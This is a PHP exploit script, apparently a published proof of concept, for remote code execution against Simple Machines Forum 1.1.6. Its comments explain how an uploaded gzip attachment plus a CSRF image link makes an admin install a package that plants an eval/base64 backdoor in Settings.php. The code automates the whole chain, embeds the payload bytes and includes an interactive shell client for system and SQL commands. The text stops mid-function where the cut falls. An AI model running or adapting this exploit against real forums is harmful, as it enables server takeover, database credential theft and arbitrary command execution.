&lt;?php
#
# Simple Machines Forum (SMF) 1.1.6 Remote Code Execution Exploit
#  Credits: Charles FOL &lt;charlesfol[at]hotmail.fr&gt;
#   URL: http://real.olympe-network.com/
#
# Note: other versions are maybe vulnerable, not tested.
#
# SMF suffers from multiples vulnerabilities.
# Combining some of them, we can obtain a remote code execution on the
# remote host. I won&#039;t talk here about all of them, but I&#039;ll explain
# how we can execute code.
#
# I - Session Code
#
# SMF administration panel is secured by a &quot;session code&quot;, a kind of
# password that must be provided by the admin browser when the admin
# is editing data.
#
# But the session code is not required for SMF package installation.
# Just to be clear : you don&#039;t need the &quot;session code&quot; to install the
# package, but you do need a valid admin session.
#
# II - Package Installation
#
# Package installation works this way :
# - The admin tells an archive file, which can be either gzip or zip, to SMF
# - SMF un(g)zip it, and analyse the XML files (yes, it work with XML)
#   to add, replace or remove code from any SMF source code file.
#
# To precise an archive to SMF, the admin is supposed to go on this URL :
# 
# http://[website]/SMF/index.php?action=packages;sa=install2;package=[filename] (1)
#
# Since $_REQUEST[&#039;package&#039;] is not checked, we can install any file
# on the server, even if the file is not in the Packages/ dir.
#
# Using CSRF, we can make an admin to install whatever package we want.
# That does not seem really interesting for now, but be patient =)
#
# III - File upload in SMF; Attachments
#
# SMF let users upload files in two cases :
# - You can upload an image to be your avatar
# - You can upload attachments to every post you submit
#
# Since uploaded images are checked, they don&#039;t interest us for now.
# 
# Attachments are not checked by SMF.
# They are renamed and moved to the attachments/ directory.
# They are renamed this way :
# [id]_[name]_[ext][md5([name].[ext])]
#
# As you can see, there is no rand(), or other strange stuff :
# we can easily find attachment name.
#
# The second part is more interesting now, no ?
#
# Now, we can submit a post with a gzip&#039;ed attachment, and make the admin
# click on a specific link, to install a package we uploaded ourself.
#
# I writed &quot;click&quot;, so many of you may say &quot;brr, that sucks&quot;.
# So here come the wait-I&#039;ve-not-finished part.
#
# IV - Wait-I&#039;ve-not-finished part
#
# SMF allows us to display remote images in our posts, using [img]&lt;url&gt;[/img]
# We can just set our image URL to ... (1) : when the admin will see our post,
# the package will be installed.
#
# V - Classic Scenario
#
# 1. We submit a fantastic post containing our nasty-attached-gzip&#039;ed package, ready
#    to be installed.
# 2. We guess the attachment name, that&#039;s pretty easy because we can retrieve the
#    attachment ID.
# 3. We modify our post, adding an [img](1)[/img], replacing [filename] by 
#    ../attachments/[the_name_you_just_found]
# 4. The administrator discover our fantastic post on his fantastic forum ...
# 5. His browser discovers our image : it goes to the specified url to download it.
#    wooops. The package is installed.
#
# VI - Exploit
#
# The exploit will login with your user account, and submit a new post/topic containing an
# attachment, a gzipped package, which permits remote code execution once installed.
# Then it will obtain the attachment ID, determine attachment name, and modify your topic to
# add a remote image (using [img][/img]).
# Then you&#039;ll have to wait for an admin to see your post ... and the package will be installed.
#
# VII - Notes
#
# - Do not forget to change SUBJECT and MESSAGE constants, to make your post a little more realistic.
# - The current gzipped package is supposed to put PHP code at the end of Settings.php file.
# - Code: if(isset($_SERVER[&#039;HTTP_SHELL&#039;])) { print 1234567890;eval(base64_decode($_SERVER[&#039;HTTP_SHELL&#039;]));print 1234567890;exit(); }
#
# First run the exploit like this :
# eg : php exploit.php -url http://localhost/forum/ -bid 2 -user tester:passwd
# And when you think the admin viewed your post, run the shell :)
# eg : php exploit.php -url http://localhost/forum/ -shell
#
# FOR EDUCATIONAL PURPOSE ONLY
#

new smf_poc();

class smf_poc
{	
	const SUBJECT = &#039;hello&#039;;
	const MESSAGE = &#039;dudes ... I love your forum ;)&#039;;
	
	function smf_poc()
	{
		$this-&gt;header();
		$this-&gt;gzip();
		$this-&gt;loadparameters();
		$this-&gt;wwwinit();
		
		if(!$this-&gt;shell)
		{
			# First of all, login
			$this-&gt;login();
			# Then submit a topic
			$this-&gt;submit_post();
			# Find attachment name and message id
			$this-&gt;get_postinfo();
			# and modify the post
			$this-&gt;edit_post();
			# finally ... wait.
			$this-&gt;wait();
		}
		else
			$this-&gt;shell();
	}
	
	function header()
	{
		$this-&gt;msg();
		$this-&gt;msg(&#039;  Simple Machines Forum (SMF) 1.1.6 Remote Code Execution Exploit&#039;);
		$this-&gt;msg(&#039;    by Charles FOL &lt;charlesfol[at]hotmail.fr&gt;&#039;);
		$this-&gt;msg();
	}
	
	function msg($msg = &#039;&#039;, $exit = 0)
	{
		print &#039;# &#039; . $msg . &quot;\n&quot;;
		
		if($exit)
		{
			$this-&gt;msg();
			exit();
		}
	}
	
	function usage()
	{
		global $argv;
		
		$name = basename($argv[0]);
		
		$this-&gt;msg(&#039;usage : php &#039; . $name . &#039; -url [url] -bid [bid] -user [user]:[passwd]&#039;);
		$this-&gt;msg(&#039;   OR   php &#039; . $name . &#039; -url [url] -shell&#039;);
		$this-&gt;msg();
		$this-&gt;msg(&#039;Parameters are :&#039;);
		$this-&gt;msg(&#039; -shell            Test if the shell is installed, and load phpreter&#039;);
		$this-&gt;msg(&#039; -bid (int)        The board ID were you want to submit the topic&#039;);
		$this-&gt;msg(&#039; -user user:passwd A valid user:password couple&#039;);
		$this-&gt;msg();
		$this-&gt;msg(&#039;eg : php &#039; . $name . &#039; -url http://localhost/forum/ -bid 2 -user tester:passwd&#039;, 1);
	}
	
	# Get every needed parameters, and load defaults
	function loadparameters()
	{
		$this-&gt;furl  = $this-&gt;getparameter(&#039;url&#039;);
		$this-&gt;shell = $this-&gt;getoption(&#039;shell&#039;);
		$this-&gt;wait  = $this-&gt;getparameter(&#039;wait&#039;, 5);
		
		if(!$this-&gt;shell)
		{
			$this-&gt;bid  = $this-&gt;getparameter(&#039;bid&#039;);
			$this-&gt;user = $this-&gt;getparameter(&#039;user&#039;);
		}
	}
	
	# Patience ...
	function wait()
	{
		$this-&gt;url-&gt;topic = $this-&gt;pid;
		$this-&gt;makeurl();
		
		$this-&gt;msg();
		$this-&gt;msg(&#039;Now, you just have to wait for an admin to see your post,&#039;);
		$this-&gt;msg(&#039;then you will be able to launch a shell using -shell.&#039;);
		$this-&gt;msg();
		$this-&gt;msg(&#039;Post URL : &#039; . $this-&gt;murl, 1);
	}
	
	# Check if a shell is available and launch phpreter
	function shell()
	{
		$this-&gt;www-&gt;addheader(&#039;Shell&#039;, &#039;MTs=&#039;);
		
		$this-&gt;url-&gt;action = &#039;forum&#039;;
		$this-&gt;get();
		
		if(!$this-&gt;match(&#039;(123456789123456789)&#039;))
			$this-&gt;msg(&#039;Shell is not available&#039;, -1);
		
		$sql = array
		(
			&#039;var_host&#039;   =&gt; &#039;$db_server&#039;,
			&#039;var_user&#039;   =&gt; &#039;$db_user&#039;,
			&#039;var_passwd&#039; =&gt; &#039;$db_passwd&#039;,
			&#039;var_db&#039;     =&gt; &#039;$db_name&#039;
		);
		
		$preter = new phpreter($this-&gt;murl, &#039;123456789(.*)123456789&#039;, &#039;cmd&#039;, $sql);
	}
	
	function wwwinit()
	{
		$this-&gt;www = new phpsploit();
		$this-&gt;www-&gt;cookiejar(1);
		$this-&gt;www-&gt;addheader(&#039;Referer&#039;, $this-&gt;furl . &#039;index.php&#039;);
	}
	
	# Log in ...
	function login()
	{
		$user = explode(&#039;:&#039;, $this-&gt;user);
		
		$this-&gt;url  = &#039;action=login2&#039;;
		$this-&gt;data = &#039;user=&#039;.$user[0].&#039;&amp;passwrd=&#039;.$user[1].&#039;&amp;cookielength=-1&#039;;
		$this-&gt;post();
		
		$this-&gt;location-&gt;action = &#039;login2&#039;;
		$this-&gt;location-&gt;sa     = &#039;check&#039;;
		
		if($this-&gt;location())
			$this-&gt;msg(&#039;Logged in as &#039; . $user[0]);
		else
			$this-&gt;msg(&#039;Can\&#039;t log in&#039;, 1);
	}
	
	# Get seqnum and sescode
	function get_sessionvars()
	{
		$this-&gt;get();
		
		$this-&gt;scode = $this-&gt;match(&#039;name=&quot;sc&quot; value=&quot;([0-9a-f]+)&quot;&#039;, 1);
		$this-&gt;sqnum = $this-&gt;match(&#039;name=&quot;seqnum&quot; value=&quot;([0-9]+)&quot;&#039;, 1);
	}
	
	# Submit our post, containing our gzipped package
	function submit_post()
	{
		# Flood control: let&#039;s sleep a little
		
		$this-&gt;msg(&#039;Waiting &#039; . $this-&gt;wait . &#039; secs (flood control)&#039;);
		sleep($this-&gt;wait);
		
		# Obtain session vars
		
		$this-&gt;url-&gt;action = &#039;post&#039;;
		$this-&gt;url-&gt;board  = $this-&gt;bid . &#039;.0&#039;;
		
		$this-&gt;get_sessionvars();
		
		# and submit the post
		
		$this-&gt;url-&gt;action = &#039;post2&#039;;
		$this-&gt;url-&gt;board  = $this-&gt;bid;
		$this-&gt;url-&gt;start  = &#039;0&#039;;
		
		$this-&gt;data = array
		(
			&#039;subject&#039;            =&gt; self::SUBJECT,
			&#039;message&#039;            =&gt; self::MESSAGE,
			&#039;sc&#039;                 =&gt; $this-&gt;scode,
			&#039;seqnum&#039;             =&gt; $this-&gt;sqnum,
			&#039;icon&#039;               =&gt; &#039;xx&#039;,
			&#039;topic&#039;              =&gt; 0,
			&#039;notify&#039;             =&gt; 0,
			&#039;lock&#039;               =&gt; 0,
			&#039;sticky&#039;             =&gt; 0,
			&#039;move&#039;               =&gt; 0,
			&#039;additional_options&#039; =&gt; 0,
			&#039;attachment[]&#039;       =&gt; array
			(
				frmdt_filename =&gt; &#039;jpeg.jpg&#039;,
				frmdt_type     =&gt; &#039;image/jpeg&#039;,
				frmdt_content  =&gt; $this-&gt;GZIP,
			)
		);
		
		$this-&gt;post();
		
		# Check the submission
		
		$this-&gt;location-&gt;board = $this-&gt;bid;
		
		if($this-&gt;location())
		{
			$this-&gt;msg(&#039;Post successfully submitted&#039;);
		}
		else
		{
			$this-&gt;msg(&#039;Error while posting&#039;);
			$this-&gt;msg(&#039;Try augmenting -wait parameter&#039;, 1);
		}
		
		# Find the post id
		
		$this-&gt;url-&gt;board = $this-&gt;bid . &#039;.0&#039;;
		$this-&gt;get();
		
		$this-&gt;pid = $this-&gt;match(&#039;topic=([0-9]+)&#039;);
		$this-&gt;pid = max($this-&gt;pid);
	}
	
	# Get the avatar ID to obtain its full name, and get msg id
	function get_postinfo()
	{
		$this-&gt;url-&gt;topic = $this-&gt;pid . &#039;.0&#039;;
		$this-&gt;get();
		
		$this-&gt;aid = $this-&gt;match(&#039;attach=([0-9]+)&#039;, 1);
		$this-&gt;mid = $this-&gt;match(&#039;msg=([0-9]+)&#039;, 1);
		
		if($this-&gt;aid)
			$this-&gt;msg(&#039;Got attachment name =)&#039;);
		else
			$this-&gt;msg(&#039;Unable to obtain attachment ID ...&#039;, 1);
		
		if(!$this-&gt;mid)
			$this-&gt;msg(&#039;Unable to obtain message ID ...&#039;, 1);
	}
	
	# Edit our precedent post : just add our &quot;image&quot;.
	function edit_post()
	{
		# Obtain session vars
		
		$this-&gt;url-&gt;action = &#039;post&#039;;
		$this-&gt;url-&gt;topic  = $this-&gt;pid;
		$this-&gt;url-&gt;msg    = $this-&gt;mid;
		$this-&gt;url-&gt;sesc   = $this-&gt;scode;
		
		$this-&gt;get_sessionvars();
		
		# Build our CSRF
		
		$this-&gt;url-&gt;action  = &#039;packages&#039;;
		$this-&gt;url-&gt;sa      = &#039;install2&#039;;
		$this-&gt;url-&gt;package = $this-&gt;aid . &#039;_jpeg_jpg&#039; . md5(&#039;jpeg.jpg&#039;);
		$this-&gt;url-&gt;package = &#039;../attachments/&#039; . $this-&gt;url-&gt;package;
		
		$this-&gt;makeurl();
		
		$img = &#039;[img]&#039; . $this-&gt;murl . &#039;[/img]&#039;;
		
		# Edit the post
		
		$this-&gt;url-&gt;action = &#039;post2&#039;;
		$this-&gt;url-&gt;sesc   = $this-&gt;scode;
		$this-&gt;url-&gt;board  = $this-&gt;bid;
		$this-&gt;url-&gt;msg    = $this-&gt;mid;
		$this-&gt;url-&gt;start  = 0;
		
		$this-&gt;data = array
		(
			&#039;topic&#039;              =&gt; $this-&gt;pid,
			&#039;subject&#039;            =&gt; self::SUBJECT,
			&#039;icon&#039;               =&gt; &#039;xx&#039;,
			&#039;message&#039;            =&gt; self::MESSAGE . $img,
			&#039;notify&#039;             =&gt; &#039;0&#039;,
			&#039;lock&#039;               =&gt; &#039;0&#039;,
			&#039;goback&#039;             =&gt; &#039;1&#039;,
			&#039;sticky&#039;             =&gt; &#039;0&#039;,
			&#039;move&#039;               =&gt; &#039;0&#039;,
			&#039;attach_del[]&#039;       =&gt; &#039;0&#039;,
			&#039;attach_del[]&#039;       =&gt; $this-&gt;aid,
			&#039;post&#039;               =&gt; &#039;Save&#039;,
			&#039;num_replies&#039;        =&gt; &#039;0&#039;,
			&#039;additional_options&#039; =&gt; &#039;0&#039;,
			&#039;sc&#039;                 =&gt; $this-&gt;scode,
			&#039;seqnum&#039;             =&gt; $this-&gt;sqnum,
		);
		
		$this-&gt;post();
		
		if($this-&gt;location(&#039;;topic=&#039; . $this-&gt;pid))
			$this-&gt;msg(&#039;Post successfully edited, everything done.&#039;);
		else
			$this-&gt;msg(&#039;Unable to edit the post&#039;);
	}
	
	# Find were we are redirected to
	function location()
	{
		# SMF likes making a mess with URL, so ... let&#039;s consider
		# all cases.
		
		$expr = &#039;&#039;;
		
		$this-&gt;location = (array) $this-&gt;location;
		
		foreach($this-&gt;location as $key =&gt; $value)
		{
			$expr .= $key . &#039;[,=]&#039; . urlencode($value) . &#039;(&amp;|;|%26|%3B)&#039;;
		}
		
		$this-&gt;location = null;
		
		$expr = substr($expr, 0, -13);
		$expr = &#039;#(Refresh|Location):.*&#039; . $expr . &#039;#i&#039;;
		
		$head = $this-&gt;www-&gt;getheader();

		return preg_match($expr, $head);
	}
	
	function match($expr, $one = 0)
	{
		# SMF likes making a mess with URL, so ... let&#039;s consider
		# all cases.
		
		$expr = str_replace(&#039;\?&#039;, &#039;[\?/]&#039;, $expr);
		$expr = str_replace(&#039;=&#039;, &#039;[,=]&#039;, $expr);
		$expr = str_replace(&#039;;&#039;, &#039;(&amp;|;|%26|%3B)&#039;, $expr, $count);
		$expr = &#039;#&#039; . $expr . &#039;#is&#039;;
		
		$count++;
		
		$http = $this-&gt;www-&gt;getcontent();
		
		if(!$one &amp;&amp; !preg_match_all($expr, $http, $match))
			return false;

		if($one &amp;&amp; !preg_match($expr, $http, $match))
			return false;
		
		return $match[$count];
	}
	
	function getoption($option)
	{
		global $argv, $argc;
		
		foreach($argv as $arg)
		{
			if($arg == &#039;-&#039; . $option)
				return true;
		}
		
		return false;
	}
	
	function getparameter($parameter, $default = false)
	{
		global $argv, $argc;
		
		for($i=0;$i&lt;$argc;$i++)
		{
			if($argv[$i] == &#039;-&#039; . $parameter)
				return $argv[$i+1];
		}
		
		if($default === false)
			$this-&gt;usage();
		
		return $default;
	}
	
	function get()
	{
		$this-&gt;makeurl();
		$this-&gt;www-&gt;get($this-&gt;murl);
	}
	
	function post()
	{
		$this-&gt;makeurl();
		
		if(is_array($this-&gt;data))
		{
			$this-&gt;data[&#039;frmdt_url&#039;] = $this-&gt;murl;
			
			$this-&gt;www-&gt;formdata($this-&gt;data);
		}
		else
			$this-&gt;www-&gt;post($this-&gt;murl, $this-&gt;data);
	}
	
	# Construct a valid URL using the url object/string.
	function makeurl()
	{
		$url = &#039;&#039;;
		
		if(is_object($this-&gt;url))
		{
			$url = &#039;&#039;;
			
			$this-&gt;url = (array) $this-&gt;url;
			
			foreach($this-&gt;url as $key =&gt; $value)
			{
				$url .= $key . &#039;=&#039; . urlencode($value) . &#039;&amp;&#039;;
			}
				
			$url = substr($url, 0, -1);
		}
		else 
			$url = $this-&gt;url;
			
		$url = $this-&gt;furl . &#039;index.php?&#039; . $url;
		
		$this-&gt;murl = $url;
		
		$this-&gt;url = null;
	}
	
	# Our SMF package ...
	function gzip()
	{
		$this-&gt;GZIP = &#039;&#039;
		. &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x0b\xed\x56\xff\x4f&quot;
		. &quot;\xda\x40\x14\xe7\x57\x4c\xfc\x1f\x9e\x64\x89\x98\x08\x6d&quot;
		. &quot;\x01\xcb\x86\xa5\xc6\x29\x8b\x26\x7e\x8b\x34\x4b\x8c\x31&quot;
		. &quot;\xe4\xa0\x87\xdc\x6c\xef\x9a\xde\x21\x92\x65\xff\xfb\xde&quot;
		. &quot;\x5d\x71\x52\xdd\x37\x12\x37\x17\xc7\xa3\x69\xb9\xbb\xf7&quot;
		. &quot;\x5e\xdf\xd7\xcf\x2b\xe3\x52\x91\x28\xaa\xde\xc5\x51\xe1&quot;
		. &quot;\x4f\x91\x63\xdb\xae\xeb\x42\xc1\x36\xf4\xf0\x84\x8c\x6a&quot;
		. &quot;\x8d\xad\x26\x38\x8e\x63\xd7\xeb\x76\xdd\x6d\xd6\x00\x1c&quot;
		. &quot;\xdb\x6d\x3a\x50\xf8\x2b\x34\x46\xff\x53\x34\x29\x15\x42&quot;
		. &quot;\x15\xfe\x3f\xf2\x76\x30\xf3\x70\x4b\x53\xc9\x04\x6f\x97&quot;
		. &quot;\x9c\xaa\x5d\xda\xf1\x57\x57\xbc\xb5\xfd\xd3\xbd\xe0\xe2&quot;
		. &quot;\xac\x03\xb1\x08\xd9\x90\x0d\x88\xc2\x73\xe8\x5e\x74\x83&quot;
		. &quot;\xce\x31\x94\x46\x4a\x25\x2d\xcb\x9a\x4c\x26\x55\xc9\xe2&quot;
		. &quot;\x24\xa2\x31\x19\x8c\x18\xa7\xb2\x2a\xd2\x6b\x0b\x35\x5a&quot;
		. &quot;\xf3\x62\x25\xa3\xb0\x52\x81\x67\xfc\xad\xae\x14\x83\x11&quot;
		. &quot;\x93\x80\x17\xe1\x40\xef\x88\xb6\x22\x6f\xec\x90\xe1\xce&quot;
		. &quot;\x50\xa4\xd0\x3d\xfe\x00\x09\x19\xdc\x90\x6b\x34\x70\x75&quot;
		. &quot;\x05\x45\x77\x83\xa0\x73\x12\x1c\x9e\x9e\xb4\xe0\x70\x08&quot;
		. &quot;\x53\x31\x06\x92\x52\x50\xe9\x94\xf1\x6b\x50\x02\x58\xd6&quot;
		. &quot;\x15\xa0\xf4\x2b\x62\xc2\xc7\xb8\x98\x6e\x1a\x46\x39\x12&quot;
		. &quot;\xe3\x28\xd4\xbc\xa8\x47\x8d\xe8\xbd\x66\xcd\x86\x8f\xb4&quot;
		. &quot;\x0a\x5a\x25\x53\x30\x61\xa8\x80\x0b\xfc\x23\xd2\x1b\x63&quot;
		. &quot;\x07\x8a\x6f\x02\x9a\x49\x24\xbe\x8b\xdc\x50\x20\x10\x09&quot;
		. &quot;\x71\x83\x7a\x88\x02\xad\x6a\x28\xa2\x48\x4c\xb4\x0d\x9a&quot;
		. &quot;\x9d\x71\xbc\xc7\x99\x2f\x78\x19\x5b\xb2\x9d\x16\x8a\x14&quot;
		. &quot;\x67\x39\x40\x97\xe5\xf7\x92\x10\x8a\x81\xb4\x32\xd3\x2b&quot;
		. &quot;\x33\x77\xaa\xc9\x28\xd1\xee\xb7\x9f\x99\x4c\x48\x8f\x1f&quot;
		. &quot;\x87\x5e\xc2\x00\x33\xd3\xa7\x30\x96\x34\xd4\x41\x35\xc9&quot;
		. &quot;\x99\xce\xce\xa4\x40\x87\x32\xb7\xa7\x10\x0a\x98\xe0\x02&quot;
		. &quot;\xb5\x60\x88\xd2\x6f\x11\xe5\x94\x86\x52\x73\xc4\x5a\x1c&quot;
		. &quot;\x99\xf0\x6e\x82\x99\xa4\x22\xa1\x69\x34\x35\xc9\x84\x67&quot;
		. &quot;\xad\xab\x8a\xaf\x75\x7a\xb9\x42\xc2\x7a\xe6\xb2\xbd\x68&quot;
		. &quot;\xd1\x67\x62\x2d\x19\x0f\x7f\x25\xaa\xfb\xa3\x68\x1a\x24&quot;
		. &quot;\x2b\xe9\xb9\xbc\xcf\x42\x20\x74\x1c\x75\x85\x48\x12\x63&quot;
		. &quot;\xd9\xc8\x2c\x76\x8c\xc3\x5c\x01\x56\xb4\x9c\xc6\xf1\x6a&quot;
		. &quot;\xe6\x45\xd1\x63\xa1\xdf\x27\xfd\x4f\x63\xc9\x5a\x7d\xc2&quot;
		. &quot;\x39\x0d\x7b\x31\x8d\xfb\xd8\xea\x3d\x72\x4b\x10\xf5\x3c&quot;
		. &quot;\x0b\x39\x34\xe3\xac\xfd\x7d\xbb\xea\x78\xd6\xfd\xc2\x64&quot;
		. &quot;\xd5\x33\x4d\xc4\xf1\xad\xed\x52\x97\x2a\x85\xb5\x29\x75&quot;
		. &quot;\x19\x19\x93\x8b\x9e\x4e\x83\x31\xd4\x2c\x8b\x9e\xa4\x24&quot;
		. &quot;\x1d\x8c\x20\x11\x92\x29\x83\x27\x94\x87\x25\xb0\x66\xa7&quot;
		. &quot;\x24\x0c\x7d\x6f\xed\x72\x6f\x7f\x37\xd8\xbd\x34\x5b\x6c&quot;
		. &quot;\x58\x66\x52\x52\x55\x7e\xd3\xeb\x76\xce\x3f\x76\xce\x2f&quot;
		. &quot;\xd7\x0f\x82\xe0\xac\xd7\x3d\xe8\x1c\x1d\xad\x5f\x6d\x6c&quot;
		. &quot;\xc0\x67\x4c\x36\xe3\x0a\x9c\x5a\xbd\xb1\xe5\x36\xdf\xbe&quot;
		. &quot;\xb3\xb7\xe9\x2d\x89\xca\x7d\x6c\x22\xb7\xd1\x0b\xe9\x40&quot;
		. &quot;\x84\xf4\x87\xe2\xdb\x4f\x85\xef\x98\x2a\x6f\x6c\xc3\x97&quot;
		. &quot;\xab\x2b\xdf\xb3\xb4\x45\xc6\x11\x2b\xe7\x89\x67\x69\xb7&quot;
		. &quot;\x35\x6a\xe5\x52\x8a\x1b\xaf\x0e\xff\x1f\x17\xcf\x0b\xcc&quot;
		. &quot;\x7f\x70\xdd\x7a\x36\xff\x1d\xd7\x75\xec\x06\xce\x7f\x67&quot;
		. &quot;\xab\xb6\x9c\xff\xff\xc6\xfc\x9f\x2f\x90\x05\xe6\xff\xbc&quot;
		. &quot;\x98\x99\xff\x39\x3d\xbf\x8d\xa8\x39\x35\x8b\x22\xaa\x86&quot;
		. &quot;\x2d\xff\xbd\x41\x3e\x98\x21\x1f\xdc\x23\x9f\x39\x5b\x08&quot;
		. &quot;\x24\xd5\x34\xa1\xfe\x3c\x1c\x78\x96\xd9\xfa\x09\x80\xa2&quot;
		. &quot;\xf6\x6c\xf2\x66\x20\x93\xc3\x12\xf6\xf0\xe1\xfd\x04\x65&quot;
		. &quot;\x10\x80\x1e\x04\xbd\x5c\x10\x5e\x23\x06\x2d\x69\x49\x4b&quot;
		. &quot;\x7a\x19\xfa\x0a\x12\x1a\xc6\x57\x00\x10\x00\x00&quot;;
	}
}

/*
 * Copyright (c) Charles FOL
 *
 * TITLE:          PHPreter
 * AUTHOR:         Charles FOL &lt;charlesfol[at]hotmail.fr&gt;
 * VERSION:        1.3
 * LICENSE:        GNU General Public License
 *
 */

class phpreter
{
	var $url;
	var $host;
	var $port;
	var $page;
	
	var $mode;
	
	var $ssql;
	
	var $prompt;
	var $phost;
	
	var $expr;
	var $data;
	
	/**
	 * __construct()
	 *
	 * @param url      The url of the remote shell.
	 * @param expr     The regular expression to catch cmd result.
	 * @param mode     Mode: php, sql or cmd.
	 * @param sql      An array with the file to include,
	 *                 and sql vars
	 * @param clear    Determines if clear() is called
	 *                 on startup
	 */
	function phpreter($url, $expr=&#039;^(.*)$&#039;, $mode=&#039;cmd&#039;, $sql=array(), $clear=false)
	{
		$this-&gt;url  = $url;
		$this-&gt;expr = &#039;#&#039; . $expr . &#039;#is&#039;;
		
		#
		# Set data
		#
		
		$infos         = parse_url($this-&gt;url);
		$this-&gt;host    = $infos[&#039;host&#039;];
		$this-&gt;port    = isset($infos[&#039;port&#039;]) ? $infos[&#039;port&#039;] : 80;
		$this-&gt;page    = $infos[&#039;path&#039;];
		
		# www.(site).com
		$host_tmp      = explode(&#039;.&#039;, $this-&gt;host);
		$this-&gt;phost   = $host_tmp[ count($host_tmp)-2 ];
		
		# Set up MySQL connection string
		$this-&gt;set_ssql($sql);
		
		# Switch to default mode
		$this-&gt;setmode($mode);
		
		#
		# Main Loop
		#

		if($clear)
			$this-&gt;clear();

		print $this-&gt;prompt;

		while( !preg_match(&#039;#^(quit|exit|close)$#i&#039;, ($cmd = trim(fgets(STDIN)))) )
		{
			# change mode
			if(preg_match(&#039;#^(set )?mode(=| )(sql|cmd|php)$#i&#039;, $cmd, $array))
				$this-&gt;setmode($array[3]);
			
			# clear data
			elseif(preg_match(&#039;#^clear$#i&#039;, $cmd))
				$this-&gt;clear();
			
			# else
			else print $this-&gt;exec($cmd);
			
			print $this-&gt;prompt;
		}
	}
	
	/**
	 * set_ssql()
	 * Build $ssql var
	 */
	function set_ssql($sql)
	{
		$this-&gt;ssql = &#039;&#039;;
		
		$sql = (object) $sql;
		
		# is there something to include ?
		
		if(isset($sql-&gt;include))
			$this-&gt;ssql .= &#039;include(\&#039;&#039; . $sql-&gt;include . &#039;\&#039;);&#039;;
			
		# mysql_connect: host, user, passwd
			
		$this-&gt;ssql .= &#039;mysql_connect(&#039;;
		
		foreach(array(&#039;host&#039;, &#039;user&#039;, &#039;passwd&#039;) as $key)
		{
			if(isset($sql-&gt;{&#039;var_&#039; . $key}))
			{
				$this-&gt;ssql .= $sql-&gt;{&#039;var_&#039; . $key} . &#039;,&#039;;
			}
			else
			{
				$this-&gt;ssql .= &quot;&#039;&quot; . $sql-&gt;{$key} . &quot;&#039;,&quot;;
			}
		}
		
		$this-&gt;ssql  = substr($this-&gt;ssql, 0, -1);
		$this-&gt;ssql .= &#039;);&#039;;
		
		# mysql_select_db
		
		if(isset($sql-&gt;var_db))
			$this-&gt;ssql .= &#039;mysql_select_db(&#039; . $sql-&gt;var_db . &#039;);&#039;;
		elseif(isset($sql-&gt;db))
			$this-&gt;ssql .= &#039;mysql_select_db(\&#039;&#039; . $sql-&gt;db . &#039;\&#039;);&#039;;
			
		# basic display for mysql results
		
		$this-&gt;ssql .= &#039;$s=str_repeat(\&#039;-\&#039;,50).&quot;\n&quot;;&#039;;
		$this-&gt;ssql .= &#039;$q=mysql_query(\&#039;&lt;CMD&gt;\&#039;) or print($s.mysql_error().&quot;\n&quot;);&#039;;
		$this-&gt;ssql .= &#039;print $s;&#039;;
		$this-&gt;ssql .= &#039;if($q)&#039;;
		$this-&gt;ssql .= &#039;{&#039;;
		$this-&gt;ssql .=     &#039;while($r=mysql_fetch_array($q,MYSQL_ASSOC))&#039;;
		$this-&gt;ssql .=     &#039;{&#039;;
		$this-&gt;ssql .=         &#039;foreach($r as $k=&gt;$v) print &quot; &quot;.$k.str_repeat(\&#039; \&#039;, 20-strlen($k)).&quot;| $v\n&quot;;&#039;;
		$this-&gt;ssql .=         &#039;print $s;&#039;;
		$this-&gt;ssql .=     &#039;}&#039;;
		$this-&gt;ssql .= &#039;}&#039;;
		
		print $this-&gt;ssql;
	}
	
	/**
	 * clear()
	 * Clear ouput, printing &quot;\n&quot;x50
	 */
	function clear()
	{
		print str_repeat(&quot;\n&quot;, 50);
		return 0;
	}
	
	/**
	 * setmode()
	 * Set mode (PHP, CMD, SQL)
	 */
	function setmode($newmode)
	{
		$this-&gt;mode   = strtolower($newmode);
		$this-&gt;prompt = &#039;[&#039;.$this-&gt;phost.&#039;][&#039;.$this-&gt;mode.&#039;]# &#039;;
		
		switch($this-&gt;mode)
		{
			case &#039;cmd&#039;:
				$this-&gt;data = &#039;system(\&#039;&lt;CMD&gt;\&#039;);&#039;;
				break;
			case &#039;php&#039;:
				$this-&gt;data = &#039;&#039;;
				break;
			case &#039;sql&#039;:
				$this-&gt;data = $this-&gt;ssql;
				break;
		}
		
		return $this-&gt;mode;
	}

	/**
	 * exec()
	 * Execute any query and catch the result.
	 */
	function exec($cmd)
	{
		if($this-&gt;data != &#039;&#039;)
			$shell = str_replace(&#039;&lt;CMD&gt;&#039;, addslashes($cmd), $this-&gt;data);
		else
			$shell = $cmd;

		$shell = base64_encode($shell);
		
		$packet  = &quot;GET &quot; . $this-&gt;page . &quot; HTTP/1.1\r\n&quot;;
		$packet .= &quot;Host: &quot; . $this-&gt;host . ( $this-&gt;port != 80 ? &#039;:&#039; . $this-&gt;port : &#039;&#039; ) . &quot;\r\n&quot;;
		$packet .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n&quot;;
		$packet .= &quot;Shell: $shell\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		
		$fp = fsockopen($this-&gt;host, $this-&gt;port, $errno, $errstr, 30);
		
		fputs($fp, $packet);
		
		$recv = &#039;&#039;;
		
		while(!feof($fp))
			$recv .= fgets($fp, 128);
		
		fclose($fp);
		
		# Remove headers
		$data    = explode(&quot;\r\n\r\n&quot;, $recv);
		$headers = array_shift($data);
		$content = implode(&quot;\r\n\r\n&quot;, $data);
		
		# Unchunk content
		if(preg_match(&quot;#Transfer-Encoding:.*chunked#i&quot;, $headers))
			$content = $this-&gt;unchunk($content);
		
		# Find results
		preg_match($this-&gt;expr, $content, $match);
		
		$match = $match[1];
		
		# Add a \n if there is not
		if(substr($match, -1) != &quot;\n&quot;)
			$match .= &quot;\n&quot;;
		
		return $match;
	}
	
	/**
	 * unchunk()
	 * Remove chunked content&#039;s sizes which are put by the apache
	 * server when it uses chunked transfert-encoding.
	 */
	function unchunk($data)
	{
		$dsize  = 1;
		$offset = 0;
		
		while($dsize&gt;0)
		{
			$hsize_size = strpos($data, &quot;\r\n&quot;, $offset) - $offset;
			
			$dsize = hexdec(substr($data, $offset, $hsize_size));
			
			# Remove $hsize\r\n from $data
			$data = substr($data, 0, $offset) . substr($data, ($offset + $hsize_size + 2) );
			
			$offset += $dsize;
			
			# Remove the \r\n before the next $hsize
			$data = substr($data, 0, $offset) . substr($data, ($offset+2) );
		}
		
